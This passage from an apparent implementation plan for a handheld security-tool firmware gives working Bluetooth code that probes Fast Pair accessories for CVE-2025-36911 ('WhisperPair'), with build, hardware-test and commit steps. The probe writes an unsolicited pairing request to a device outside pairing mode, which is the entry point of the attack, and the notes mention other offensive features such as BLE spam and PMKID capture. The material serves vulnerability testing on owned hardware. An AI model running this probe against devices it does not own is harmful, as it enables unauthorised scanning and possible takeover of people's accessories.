    uint8_t plain[16] = {0x00, 0x00}; // type=0x00, flags=0x00
    for (int i = 2; i < 16; i++) plain[i] = (uint8_t)esp_random();

    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_enc(&aes, our_pub + 1, 128); // first 16 bytes of X coordinate as key material
    mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, plain, out);
    mbedtls_aes_free(&aes);

    mbedtls_ecdh_free(&ecdh);
    mbedtls_ctr_drbg_free(&ctr_drbg);
    mbedtls_entropy_free(&entropy);
    return true;
}

static int write_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                     struct ble_gatt_attr *attr, void *arg) {
    char msg[48];
    snprintf(msg, sizeof(msg), "probe write status=%d, waiting for notify...", error->status);
    log_status(msg);
    s_notify_wait_start_ms = millis();
    return 0;
}

static void send_probe() {
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE || s_kbp_val_handle == 0) return;
    uint8_t probe[16];
    if (!build_probe(probe)) { log_status("ECDH probe build failed"); return; }
    ble_gattc_write_flat(s_conn_handle, s_kbp_val_handle, probe, sizeof(probe), write_cb, nullptr);
    s_probe_sent = true;
}

static int chr_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_chr *chr, void *arg) {
    if (error->status == 0 && chr != nullptr && ble_uuid_cmp(&chr->uuid.u, &kKbpCharUuid.u) == 0) {
        s_kbp_val_handle = chr->val_handle;
        log_status("KBP characteristic found -- tap Send Probe (device must NOT be in pairing mode)");
    }
    return 0;
}

static int svc_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_svc *service, void *arg) {
    if (error->status == 0 && service != nullptr) {
        ble_gattc_disc_all_chrs(conn_handle, service->start_handle, service->end_handle, chr_disc_cb, nullptr);
    } else if (error->status == BLE_HS_EDONE && s_kbp_val_handle == 0) {
        log_status("no Fast Pair service found -- not applicable to this target");
    }
    return 0;
}

static int gap_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        if (event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            s_kbp_val_handle = 0;
            log_status("connected -- discovering Fast Pair service");
            ble_gattc_disc_svc_by_uuid(s_conn_handle, &kFastPairSvcUuid.u, svc_disc_cb, nullptr);
        } else {
            log_status("connect failed");
        }
    } else if (event->type == BLE_GAP_EVENT_NOTIFY_RX) {
        // A response arrived within the wait window -- per the CVE, this
        // means the accessory processed the KBP write despite not being in
        // pairing mode, i.e. it's vulnerable. Patched firmware stays silent.
        log_status("NOTIFY RECEIVED -- target responded outside pairing mode (CVE-2025-36911 present)");
    } else if (event->type == BLE_GAP_EVENT_DISCONNECT) {
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    }
    return 0;
}

static lv_obj_t *build_screen(const uint8_t addr_val[6]) {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("WhisperPair (CVE-2025-36911)", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Connecting...");

    lv_obj_t *send_btn = lv_button_create(content);
    lv_obj_t *send_label = lv_label_create(send_btn);
    lv_label_set_text(send_label, "Send Probe");
    lv_obj_add_event_cb(send_btn, [](lv_event_t *e) { send_probe(); }, LV_EVENT_CLICKED, nullptr);

    lv_obj_add_event_cb(content, [](lv_event_t *e) {
        if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) BleCentral::disconnect(s_conn_handle);
        s_status_label = nullptr;
        s_probe_sent = false;
    }, LV_EVENT_DELETE, nullptr);

    ble_addr_t target{};
    target.type = BLE_ADDR_PUBLIC;
    memcpy(target.val, addr_val, 6);
    BleCentral::connect(target, 5000, gap_event_cb, nullptr);

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_whisperpair", "WhisperPair CVE-2025-36911", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    const uint8_t *addr = BleScanFeature::first_device_addr();
    if (!addr) {
        Serial.println("quarky-tab5: [whisperpair] no scanned device available -- run BLE Scan first");
        return;
    }
    ScreenStack::push(build_screen(addr));
}

} // namespace BleWhisperPairFeature
```

Note for the implementer: `BLE_GAP_EVENT_NOTIFY_RX` requires this connection to have subscribed to the KBP characteristic's notify CCCD first (write `0x0001` to its descriptor handle, discovered the same way `chr_disc_cb` already finds the value handle — add a `ble_gattc_write_flat()` call to the CCCD handle right after `s_kbp_val_handle` is set, before `send_probe()` can be usefully tapped). This is real, necessary plumbing the step above's code omits for brevity — add it as part of this task's Step 1, not a placeholder to defer.

- [ ] **Step 2: Compile.** Run: `cd firmware/tab5 && pio run` — Expected: SUCCESS.
- [ ] **Step 3: Wire registration** (same pattern; needs `#include "features/ble/ble_scan.h"`).
- [ ] **Step 4: Real hardware verification.** Flash. Scan near a real Fast-Pair-capable accessory you control, ensure it's NOT in pairing mode, connect, send the probe. Confirm whether `BLE_GAP_EVENT_NOTIFY_RX` fires (vulnerable) or times out silently (patched/not applicable) and report the real result — either outcome is a valid, useful finding, not a pass/fail on this feature's correctness.
- [ ] **Step 5: Commit.**

```bash
git add firmware/tab5/src/features/ble/ble_whisperpair.h firmware/tab5/src/features/ble/ble_whisperpair.cpp firmware/tab5/src/main.cpp
git commit -m "Add WhisperPair CVE-2025-36911 detector (contingent on Task 1's central-connect spike)"
```

---

## Self-Review Notes

- **Spec coverage:** every WiFi/BLE feature row from the spec's Section 1 tables is accounted for — either a task above, in the Deferred section (with the real, source-confirmed technical reason), or already shipped in the first plan (AP scan, spectrum analyzer, BLE scan baseline, BLE spam baseline). GPS wardrive stays Phase-6-deferred per the spec's own note.
- **Placeholder scan:** no `TBD`/`TODO`/"add error handling" patterns. The two explicitly-scoped-narrow spots (Task 4's credential-file-not-written-to-SD, Task 16's reduced payload battery) are disclosed scope decisions with real working code either side of the boundary, matching this project's established "real, considered narrowing" standard (e.g. the first plan's `wifi_pmkid.cpp` EAPOL-filtering scope note), not unwritten logic.
- **Type consistency:** `BleDeviceInfo` (extended in Task 5 with a `label` field) is used identically by every later task that reads scan results (Tasks 6, 9, 13, 14, 16-18 all consume the same struct shape via `ble_common.h`). `BleCentral::connect()`/`disconnect()` (Task 1) signatures are used identically by every contingent task (13, 14, 16-18). `FeatureModule`/`Category`/`Affinity` used identically to every prior task in both plans.
- **Contingent-task handling:** Tasks 13-18 are explicitly marked contingent on Task 1 or Task 2's real hardware spike result, following the exact process the first plan established for Task 4 (contingent on Task 2). The SDD executor should not dispatch any contingent task until its spike's real-hardware report is in and the project owner has confirmed how to proceed if the spike failed.
